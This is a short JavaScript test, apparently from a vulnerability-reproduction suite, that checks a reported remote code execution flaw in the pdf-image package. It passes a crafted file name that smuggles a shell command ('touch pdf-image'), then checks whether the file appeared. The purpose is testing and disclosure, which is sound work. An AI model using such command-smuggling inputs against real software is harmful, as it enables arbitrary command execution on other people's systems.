//https://hackerone.com/reports/781664
test("Remote code execution in pdf-image", () => {
  var PDFImage = require("pdf-image").PDFImage;
  const fs = require("fs");
  const path = "./pdf-image";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let pdfImage = new PDFImage('"; touch pdf-image #"');

    pdfImage.getInfo().then(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);

      fs.unlink(path, function (err) {}); //deleting the file after creation
    });
  } catch (error) {}
});